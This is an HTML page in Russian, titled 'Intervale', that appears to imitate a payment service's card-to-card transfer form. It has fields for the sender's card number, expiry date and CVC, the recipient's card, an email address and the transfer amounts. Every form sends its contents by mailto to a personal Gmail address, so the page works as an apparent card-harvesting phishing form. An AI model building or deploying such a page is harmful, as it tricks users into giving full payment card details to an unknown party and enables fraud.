<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Intervale</title>
  <link rel="stylesheet" href="css/styles.css">
  <link href="https://fonts.google.com/specimen/Open+Sans?selection.family=Open+Sans" rel="stylesheet">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <script src="js/config.js" defer></script>
</head>

<body>
<container class="row">

  <div class="fontsize-1 col-md-6">

    <h6 class="datasending"> Данные отправителя </h6>

    <div class="bank_card card1">
      <div class="card_label" id="card_label_owner"></div>
      <div>
        <p class="numbercard">Номер карты</p>
        <form class="input1" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
          <p><input class="inputer" type="text" name="a" oninput="detectCardType(event, 'card_label_owner')"></p>
        </form>
      </div>

      <hr class="line1">

      <div>
        <p class="numbercard1"> Срок действия</p>
        <form class="input2" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
          <p><input name="a" type="text" class="inputer1" placeholder="MM"></p>
        </form>
        <hr class="line2">
        /
        <form class="input2-1" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
          <p><input name="a" type="text" class="inputer2" placeholder="ГГ"></p>
        </form>
        <hr class="line2-1">
      </div>

      <div>

        <p class="numbercard2">CW/CVC</p>

        <form class="input3" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
          <p><input name="a" type="text" class="inputer3"></p>
        </form>
        <hr class="line3">
        <a href="#"> <img src="img/question.png" class="question" height="20" width="20"/></a>
      </div>
    </div>
  </div>

  <div class="fontsize-2 col-md-6">
    <h6 class="datagetting"> Данные получателя </h6>
    <div class="card2 bank_card">
      <div class="card_label" id="card_label_receiver"></div>
      <div class="card2-1">
        <p class="numbercard">Номер карты</p>
        <form class="input1" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
          <p><input type="text" class="inputer" name="a" oninput="detectCardType(event, 'card_label_receiver')"></p>
        </form>
      </div>
      <hr class="line4">
    </div>
  </div>
  <div class="line2-1-1"></div>
  <div class="inputer1-1"></div>

  <section class="col-md-6">
    <div class="sender">
      <input type="checkbox" name="option2" value="a2"> Отправить чек на e-mail<Br>
    </div>

    <form class="input4" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
      <p><input class="inputer4" name="a" type="text" placeholder="Ваш e-mail"></p>
    </form>
    <div>
      <p class="summa"> Сумма перевода</p>
      <form class="input4" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
        <div class="currency_input"><input class="inputer4" name="a" type="text" placeholder="От 500 до 500000">
          <span class="currency"></span></div>
      </form>

      <p class="summa"> Итоговая сумма</p>
      <form class="input4" action="mailto:zohan1234567@gmail.com" enctype="text/plain">
        <div class="currency_input"><input class="inputer4" name="a" type="text" placeholder="От 680 до 530150">
          <span class="currency"></span></div>
      </form>


    </div>
  </section>

  <section class="col-md-6">

    <div class="sender">
      <input type="checkbox" name="option2" value="a2"> Добавить сообщение получателю
      <a href="#"><img src="img/question.png" class="question1" height="20" width="20"/></a>
    </div>

  </section>

  <button class="button1" id="transferBtn">Перевести</button>


</container>


<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
        crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
        crossorigin="anonymous"></script>
</body>
</html>
